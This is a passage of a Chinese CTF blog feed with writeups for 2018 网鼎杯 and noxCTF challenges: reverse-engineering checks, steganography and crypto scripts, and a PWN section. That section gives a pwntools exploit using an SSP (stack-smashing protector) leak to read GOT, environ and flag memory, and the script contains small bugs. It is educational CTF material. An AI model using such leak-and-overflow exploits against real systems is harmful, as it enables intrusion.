class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xdc</span>)==<span class="number">0x2dd</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line">model = s.model()</span><br><span class="line">ans = [model[a],model[b],model[c],model[d],model[e],model[f],model[g],model[h], model[i],model[j],model[k],model[l],model[m],model[n],model[o],model[p],<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line">flag = <span class="string">''</span>.join([chr(int(str(x))) <span class="keyword">for</span> x <span class="keyword">in</span> ans])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h2><p>漏洞点很明显，<code>gets</code>处可以溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [rsp+60h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3L</span>L;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  sub_4009A6();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">"./flag.txt"</span>, <span class="number">0</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"./flag.txt"</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This is GUESS FLAG CHALLENGE!"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"you have no sense... bye :-) "</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();                          <span class="comment">// fork()</span></span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please type your guessing flag"</span>);</span><br><span class="line">  gets((__int64)&amp;s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;buf, &amp;s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You must have great six sense!!!! :-o "</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You should take more effort to get six sence, and one more challenge!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksec后发现开了<code>Canary</code>。<code>Canary</code>检查失败的时候调用<code>__stack_chk_fail</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>) &#123;   </span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>__fortify_fail</code>打印出了<code>__libc_argv[0]</code>所指向字符串：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *msg; &#123;</span><br><span class="line">      <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">         <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">              __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>, msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure><p>可以通过覆盖<code>__libc_argv[0]</code>实现读取想要的数据，也就是<a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">SSP（Stack Smashing Protector） Leak</a>。调试过程中有一个比较容易获取指针的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p &amp;__libc_argv[0]</span><br><span class="line">$1 = (char **) 0x7fffffffe4c8</span><br></pre></td></tr></table></figure><p>然后因为libc导出了一个符号<a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="noopener">environ</a>，其值和<code>main</code>函数的第三个参数<code>envp</code>一样。这样的话，只要泄漏出libc的基址就可以得到栈上的地址。</p><p>三次进程正好分为：</p><ol><li>利用got表得到libc地址</li><li>利用libc的environ得到stack地址</li><li>计算flag地址并输出</li></ol><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./guess'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'106.75.90.160'</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./guess'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">buf = <span class="number">0x7fffffffe4d0</span></span><br><span class="line">argv_0 = <span class="number">0x7fffffffe5f8</span></span><br><span class="line">offset1 = argv_0 - gets</span><br><span class="line">offset2 = <span class="number">0x7ffd12119a88</span> - <span class="number">0x7ffd12119920</span></span><br><span class="line">gets_got = elf.got[<span class="string">'gets'</span>] <span class="comment"># 0x602058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># got ==&gt; libc</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset1 + p64(gets_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">gets_got = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(gets_got)</span><br><span class="line">libc_base = gets_got - libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc ==&gt; environ ==&gt; stack</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset1 + p64(libc.symbols[<span class="string">'environ'</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'B'</span> * offset1 + p64(stack - offset2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="minified"><a href="#minified" class="headerlink" title="minified"></a>minified</h2><p>取出Alpha0和Green0通道的图片后异或得到flag。</p><p><img src="/pics/2018-网鼎杯-review/minified/1.PNG" alt="Alpha0"></p><p><img src="/pics/2018-网鼎杯-review/minified/2.PNG" alt="Green0"></p><p><img src="/pics/2018-网鼎杯-review/minified/3.PNG" alt="flag"></p><h2 id="双色块"><a href="#双色块" class="headerlink" title="双色块"></a>双色块</h2><p>先上binwalk得到图片，key为ctfer2333。</p><p>尝试把gif每一个帧拼凑成图片，发现无法得到一个正常的二维码。</p><p>再猜测将紫色与绿色色块分别表示1和0，先提取出每张图片：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(gif_file)</span>:</span></span><br><span class="line">    png_dir = <span class="string">'frame/'</span></span><br><span class="line">    img = Image.open(gif_file)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            current = img.tell()</span><br><span class="line">            <span class="keyword">print</span> current</span><br><span class="line">            img.save(png_dir + str(current + <span class="number">1</span>) + <span class="string">'.png'</span>)</span><br><span class="line">            img.seek(current + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    gif_file = <span class="string">'out.gif'</span></span><br><span class="line">    main(gif_file)</span><br></pre></td></tr></table></figure><p>再读取图片内容，转换成0和1，最后每8位转为一个ascii字符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    png_dir = <span class="string">'frame/'</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">        line = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">            file_name = <span class="string">'frame/'</span> + str(i * <span class="number">24</span> + j + <span class="number">1</span>) + <span class="string">'.png'</span></span><br><span class="line">            x = j * <span class="number">10</span> + <span class="number">5</span></span><br><span class="line">            y = i * <span class="number">10</span> + <span class="number">5</span></span><br><span class="line">            img = Image.open(file_name)</span><br><span class="line">            img = img.convert(<span class="string">'RGB'</span>) </span><br><span class="line">            img_array = img.load()</span><br><span class="line">            r, g, b = p = img_array[x, y]</span><br><span class="line">            <span class="keyword">if</span> g == <span class="number">255</span>:</span><br><span class="line">                line += <span class="string">'0'</span></span><br><span class="line">            <span class="keyword">if</span> r == <span class="number">255</span> <span class="keyword">and</span> b == <span class="number">255</span>:</span><br><span class="line">                line += <span class="string">'1'</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">8</span>:</span><br><span class="line">                ret += chr(int(line, <span class="number">2</span>))</span><br><span class="line">                line = <span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>去掉得到的字符串后面的hhhhh，因为明显不像加密后的内容，尝试base64无果后，用DES解密，密钥即为一开始得到的ctfer2333，得到flag。</p><h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p>解压后用cat把所有的文件合并，得到一个zip文件，爆破密码得到flag。</p><p><img src="/pics/2018-网鼎杯-review/welcome/1.png" alt="爆破结果"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="shanghai"><a href="#shanghai" class="headerlink" title="shanghai"></a>shanghai</h2><p>维吉尼亚解密，<a href="https://guballa.de/vigenere-solver" target="_blank" rel="noopener">在线解密</a>，直接得到flag。</p><p><img src="/pics/2018-网鼎杯-review/shanghai/1.png" alt="flag"></p><p>同时还得到密钥是icqvigenere。</p><h2 id="apl"><a href="#apl" class="headerlink" title="apl"></a>apl</h2><p>之前PladCTF有<a href="https://monosource.github.io/writeup/2018/05/08/plaidctf-aplunatics/" target="_blank" rel="noopener">一道类似的题目</a>，在xman的时候也分析过。</p><p>apl最大的特点是从右往左计算。<code>⍵</code>代表右侧的变量，<code>α</code>代表左侧的变量。</p><p>一开始给了一长串base64字符串，解密后得到apl：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;⍵(~⍵)/(&apos;No_Please_continue&apos;)(&apos;Yes,This_is_flag&apos;)&#125;(∊(41(41)0+140)(⎕UCS(&apos;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&apos;))146)&#123;+/⍺≠33+2⊥(1(5)×8)⍴∊&#123;a≠8↑(1,a←(8⍴2)⊤⍵)&#125;¨2⊥8(+/⍴⍳(7*2)-⌊9.1⌊⍴&apos;FlagIsWhat&apos;)⍴10⊖⊖⌽(∊4(⍴⍴88888)+16)⍴(1+(|¯8)⍴1)⊤⎕UCS(⍵)&#125;&apos;YourFlagIsWhat?&apos;</span><br></pre></td></tr></table></figure><p>先分成几个部分：</p><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2. ```(∊(41(41)0+140)(⎕UCS(&apos;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&apos;))146)``` ==&gt; ```181 181 140 181 283 187 213 256 36 35 286 36 232 225 203 286 286 285 96 226 222 288 92 120 57 100 35 34 33 288 34 75 69 40 169 36 35 286 36 81 60 107 146</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">再通过主要加密过程分析，根据apl的特性应该倒着来：</span><br><span class="line"></span><br><span class="line">1. `(1+(|¯8)⍴1)⊤⎕UCS(⍵)` ==&gt; 将ascii转换成二进制</span><br><span class="line">2. `(∊4(⍴⍴88888)+16)` ==&gt; 20 16，即将右侧的矩阵填充为20*16</span><br><span class="line">3. `10⊖⊖⌽` ==&gt; 将矩阵的行倒序，列向上位移10</span><br><span class="line">4. `8(⍴⍳(7*2)-⌊9.1⌊⍴&apos;FlagIsWhat&apos;)` ==&gt; 8 40，即将右侧的矩阵填充为8*40</span><br><span class="line">5. `2⊥` ==&gt; 将二进制转换成ascii</span><br><span class="line">6. `&#123;a≠8↑(1,a←(8⍴2)⊤⍵)&#125;` ==&gt; x ^ (x &gt;&gt; 1)</span><br><span class="line">7. `+/⍺≠33+2⊥(1(5)×8)` ==&gt; `¨`按列读取矩阵，然后经过上一步的移位异或，转为ascii码并加上33</span><br><span class="line"></span><br><span class="line">接下来按步骤逆向即可：</span><br><span class="line"></span><br><span class="line">```apl</span><br><span class="line">⎕UCS(2⊥(8 40)⍴⌽⊖10⊖(20 16)⍴(8⍴2)⊤(106 202 104 193 192 206 201 100 192 194 204 194 75 200 206 106 193 75 192 201 201 194 75 206 196 98 206 75 196 192 201 108 198 204 100 193 46 40 35 38))</span><br></pre></td></tr></table></figure></li></ol><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://www.jianshu.com/p/005bda1f8535" target="_blank" rel="noopener">https://www.jianshu.com/p/005bda1f8535</a><br><a href="https://www.anquanke.com/post/id/158386#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158386#h3-5</a><br><a href="https://xz.aliyun.com/t/2665" target="_blank" rel="noopener">https://xz.aliyun.com/t/2665</a><br><a href="https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3w</a><br><a href="https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/" target="_blank" rel="noopener">https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/</a><br><a href="https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism" target="_blank" rel="noopener">https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism</a><br><a href="https://www.jianshu.com/p/005bda1f8535" target="_blank" rel="noopener">https://www.jianshu.com/p/005bda1f8535</a><br><a href="https://blog.csdn.net/whklhhhh/article/details/81950438" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/details/81950438</a><br><a href="https://xz.aliyun.com/t/2614" target="_blank" rel="noopener">https://xz.aliyun.com/t/2614</a><br><a href="https://blog.csdn.net/whklhhhh/article/details/82217266" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/details/82217266</a><br><a href="https://xz.aliyun.com/t/2666" target="_blank" rel="noopener">https://xz.aliyun.com/t/2666</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="review" scheme="https://qianfei11.github.io/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>2018-noxCTF-writeup</title>
    <link href="https://qianfei11.github.io/2018/09/10/2018-noxCTF-writeup/"/>
    <id>https://qianfei11.github.io/2018/09/10/2018-noxCTF-writeup/</id>
    <published>2018-09-10T10:01:51.000Z</published>
    <updated>2018-11-11T05:02:54.378Z</updated>
    
    <content type="html"><![CDATA[<p>记录几道简单题。</p><a id="more"></a><h1 id="RE-GuessTheString"><a href="#RE-GuessTheString" class="headerlink" title="RE-GuessTheString"></a>RE-GuessTheString</h1><p>把每个check分辨出来，然后逐一分析，先判断字符串长度：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">check1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(a1) == <span class="number">11</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断每个字符是否都大于32：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check2</span><span class="params">(_BYTE *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  _BOOL4 i; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = s;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &amp;&amp; *v2; i = bigger_than_32(*v2++) )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个字符不等于66且第一个字符与第二个字符的乘积为3478，可分解质因数求解：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check3</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *s == <span class="number">66</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *s * s[<span class="number">1</span>] != <span class="number">3478</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前三个数连续异或得到49:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check4</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)(s[<span class="number">1</span>] ^ *s) ^ (<span class="keyword">unsigned</span> __int8)s[<span class="number">2</span>]) != <span class="number">49</span> )</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四个数大于第三个数，但是两者平方和相等，显然是溢出，在计算中通过模256（即0xFF）来实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check5</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( s[<span class="number">3</span>] &gt; s[<span class="number">2</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">2</span>] * s[<span class="number">2</span>] != s[<span class="number">3</span>] * s[<span class="number">3</span>] )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来还出现了一个检查素数的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 